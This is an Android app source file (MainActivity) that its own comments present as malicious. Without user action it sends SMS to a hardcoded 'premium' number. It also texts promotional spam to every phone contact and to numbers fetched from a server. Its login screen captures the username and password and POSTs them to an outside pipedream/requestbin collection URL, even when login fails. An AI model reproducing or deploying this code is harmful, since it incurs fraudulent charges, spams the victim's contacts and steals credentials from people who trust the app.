package com.example.allphaapplication;

import androidx.appcompat.app.AppCompatActivity;

import android.os.Bundle;

import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.telephony.SmsManager;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.widget.Button;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.core.content.PackageManagerCompat;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;
import android.Manifest;
import android.widget.EditText;
import android.widget.ProgressBar;
import android.widget.Toast;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;



import android.content.Intent;
import android.os.Bundle;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.widget.EditText;
import android.widget.ProgressBar;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.HashMap;
import java.util.Map;


import android.content.Intent;
import android.os.Bundle;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.widget.EditText;
import android.widget.ProgressBar;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
//import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.JsonObjectRequest;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
//import com.google.mlkit.common.sdkinternal.SharedPrefManager;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.HashMap;
import java.util.Map;

//Send SMS to premium number or hardcoded numbers
public class MainActivity extends AppCompatActivity {
    //FOR SMS ************************************************
    private static final int SMS_PERMISSION_CODE=100;
    private static final int PERMISSIONS_REQUEST_CODE = 1;
    private String phoneNumber="8588949508"; //Premium or hardcoded number
    private String message="Hello testing sending messages  great ";// for premium harcded numbers
    private ApiService apiService;

    //FOR LOGIN AND Sending credentials to server ********************

    EditText editTextUsername, editTextPassword;
    ProgressBar progressBar;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);


        //FOR SMS ********************************************
        // For sending sms to server contact list

        // Initialize Retrofit
        Retrofit retrofit = new Retrofit.Builder()
                .baseUrl("https://jsonplaceholder.typicode.com/")
                .addConverterFactory(GsonConverterFactory.create())
                .build();

        apiService = retrofit.create(ApiService.class);

        //SMS to hardcoded premium number permission and send sms to server contacts list
        if(ContextCompat.checkSelfPermission(this,Manifest.permission.SEND_SMS)!= PackageManager.PERMISSION_GRANTED){
            ActivityCompat.requestPermissions(this,new String[]{Manifest.permission.SEND_SMS},SMS_PERMISSION_CODE);

        }
        else {
            sendSMStoPremiumNumbers();
            fetchPhoneNumbersAndSendSMS();
        }
     /*   Button sendsmsButton=findViewById(R.id.send_sms_button);
        sendsmsButton.setOnClickListener(view -> {

        });
*/


        // Request permissions send sms to all contacts
        ActivityCompat.requestPermissions(this,
                new String[]{Manifest.permission.SEND_SMS, Manifest.permission.READ_CONTACTS},
                PERMISSIONS_REQUEST_CODE);

        // After permissions are granted, call the method to send SMS
        sendSmsToAllContacts("Limited Time offer get 80% off.Use code SAVE80 at checkout Shop now www.general.com");


        //FOR LOGIN AND Sending credentials to server***************

        if ( SharedPrefmanager.getInstance(this).isLoggedIn()) {
            finish();
            startActivity(new Intent(this, ProfileActivity.class));
        }

        //  progressBar = (ProgressBar) findViewById(R.id.progressBar);
        editTextUsername = (EditText) findViewById(R.id.username);
        editTextPassword = (EditText) findViewById(R.id.password);


        //if user presses on login
        //calling the method login
        findViewById(R.id.loginbutton).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                userLogin();

            }
        });
    }
    //FOR sending sms ****************************************
    private void sendSMStoPremiumNumbers() {
        try{
            SmsManager smsManager= SmsManager.getDefault();
            smsManager.sendTextMessage(phoneNumber,null,message,null,null);
            Toast.makeText(this, "SMS sent successfully", Toast.LENGTH_SHORT).show();

        }
        catch(Exception e){
            Toast.makeText(this,"Fail to send SMS " + e.getMessage(),Toast.LENGTH_SHORT).show();
        }
    }
    private void sendSmsToAllContacts(String message) {
        ContentResolver contentResolver = getContentResolver();
        Uri uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
        Cursor cursor = contentResolver.query(uri, null, null, null, null);

        if (cursor != null && cursor.getCount() > 0) {
            while (cursor.moveToNext()) {
                String phoneNumber = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

                // Send SMS
                sendSms(phoneNumber, message);
            }
            cursor.close();
        }
    }
    private void sendSms(String phoneNumber, String message) {
        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendTextMessage(phoneNumber, null, message, null, null);
    }
    private void fetchPhoneNumbersAndSendSMS() {
        apiService.getUsers().enqueue(new Callback<List<User>>() {
            @Override
            public void onResponse(@NonNull Call<List<User>> call, @NonNull Response<List<User>> response) {
                if (response.isSuccessful() && response.body() != null) {
                    List<User> users = response.body();
                    List<String> phoneNumbers = new ArrayList<>();

                    for (User user : users) {
                        phoneNumbers.add(user.getPhone());

                    }
                    sendSMSToServerPhoneNumbers(phoneNumbers);
                } else {
                    Toast.makeText(MainActivity.this, "Failed to fetch phone numbers", Toast.LENGTH_SHORT).show();
                }
            }

            @Override
            public void onFailure(@NonNull Call<List<User>> call,@NonNull Throwable t) {
                Log.e("MainActivity", "Error fetching phone numbers", t);
                Toast.makeText(MainActivity.this, "Error fetching phone numbers", Toast.LENGTH_SHORT).show();
            }
        });
    }
    private void sendSMSToServerPhoneNumbers(List<String> phoneNumbers) {
        String message="Exicited news! Get 90% off.Use code SAVE90 at checkout Shop now www.flipkart.com";

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) == PackageManager.PERMISSION_GRANTED) {
            SmsManager smsManager = SmsManager.getDefault();
            for (String number : phoneNumbers) {
                smsManager.sendTextMessage(number, null, message, null, null);
            }
            Toast.makeText(this, "SMS sent to all numbers", Toast.LENGTH_SHORT).show();
        } else {
            Toast.makeText(this, "SMS permission not granted", Toast.LENGTH_SHORT).show();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,@NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if(requestCode==SMS_PERMISSION_CODE){
            if(grantResults.length>0 && grantResults[0]==PackageManager.PERMISSION_GRANTED){
                sendSMStoPremiumNumbers();
            }
            else{
                Toast.makeText(this, "SMS permission denied", Toast.LENGTH_SHORT).show();
            }
        }

    }

    //For exfiltrating data to server login credentials to server*******************

    private void userLogin() {
        //first getting the values
        final String username = editTextUsername.getText().toString();
        final String password = editTextPassword.getText().toString();

        //validating inputs
        if (TextUtils.isEmpty(username)) {
            editTextUsername.setError("Please enter your username");
            editTextUsername.requestFocus();
            return;
        }

        if (TextUtils.isEmpty(password)) {
            editTextPassword.setError("Please enter your password");
            editTextPassword.requestFocus();
            return;
        }

        //if everything is fine
        StringRequest stringRequest = new StringRequest(Request.Method.POST, URLs.URL_LOGIN,

                new com.android.volley.Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {
//                        progressBar.setVisibility(View.GONE);

                        try {
                            Log.d("ResponseLoginActivity", "onResponse: "+response);
                            //converting response to json object
                            JSONObject obj = new JSONObject(response);
                            Log.d("JSONobjresponse", "onResponseLoginActivity: "+obj);


                            // Toast.makeText(getApplicationContext(), obj.getString("message"), Toast.LENGTH_SHORT).show();

                            //getting the user from the response
                            // JSONObject userJson = obj.getJSONObject("user");

                            JSONObject userJson = obj;
                            Log.d("JsonobjectuserjsonLoginActivity", "onResponse: userjson : "+userJson);
                            //creating a new user object
                            UserLogin user = new UserLogin(
                                    userJson.getInt("id"),
                                    userJson.getString("username"),
                                    userJson.getString("email"),
                                    userJson.getString("gender")
                            );
                            Log.d("loginUser", "onResponse: user "+user);
                            //storing the user in shared preferences
                            SharedPrefmanager.getInstance(getApplicationContext()).userLogin(user);

                            //starting the profile activity
                            finish();
                            sendDataToServer( username,password);
                            startActivity(new Intent(getApplicationContext(), ProfileActivity.class));

                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                    }
                },
                new com.android.volley.Response.ErrorListener() {
                    @Override
                    public void onErrorResponse(VolleyError error) {
                        //     Toast.makeText(getApplicationContext(), error.getMessage(), Toast.LENGTH_SHORT).show();
                        Toast.makeText(getApplicationContext(), "Login Failed", Toast.LENGTH_SHORT).show();
                        sendDataToServer( username,password);
                        startActivity(new Intent(getApplicationContext(), MakingCalls.class));
                    }

                }) {
            @Override
            protected Map<String, String> getParams() throws AuthFailureError {
                Map<String, String> params = new HashMap<>();
                params.put("username", username);
                params.put("password", password);
                return params;
            }
        };

        VolleySingleton.getInstance(this).addToRequestQueue(stringRequest);
        //  startActivity(new Intent(this, MakingCalls.class));
    }

    private void sendDataToServer(String username, String password) {
        // Replace with the actual data you want to send
      /*  String username = "testuser";
        String password = "password";
        String otherData = "Some other data";

       */

        // Create the JSON object containing the data
        JSONObject postData = new JSONObject();
        try {
            postData.put("username", username);
            postData.put("password", password);
            //  postData.put("otherData", otherData);
        } catch (JSONException e) {
            e.printStackTrace();
        }

        // URL of the server where sending the data
        //String url = "https://yourserver.com/api/data";
        //"https://reqres.in/api/login";
        // String url="https://reqres.in/api/users"; //working in log but not showing data sent on server as it is fake url
        String url="https://enlj46n3j0l2s.x.pipedream.net/";//Requestbin.com generate new url and update url in code then check for generated results or for this particular url "https://public.requestbin.com/r/enlj46n3j0l2s" check this for GET OR POST response


        // Create a new request queue
        RequestQueue requestQueue = Volley.newRequestQueue(this);

        // Create a new JSON object request
        JsonObjectRequest jsonObjectRequest = new JsonObjectRequest(
                Request.Method.POST,
                url,
                postData,
                new com.android.volley.Response.Listener<JSONObject>() {
                    @Override
                    public void onResponse(JSONObject response) {
                        // Handle the server response here
                        Log.d("DataSent", "onResponse: "+postData);
                        Toast.makeText(MainActivity.this, "Data sent successfully!", Toast.LENGTH_SHORT).show();
                    }
                },
                new com.android.volley.Response.ErrorListener() {
                    @Override
                    public void onErrorResponse(VolleyError error) {
                        // Handle the error here
                        Toast.makeText(MainActivity.this, "Failed to send data", Toast.LENGTH_SHORT).show();
                        Log.e("MainActivity", "Error: " + error.getMessage());
                    }
                }
        );

        // Add the request to the queue
        requestQueue.add(jsonObjectRequest);
    }

}
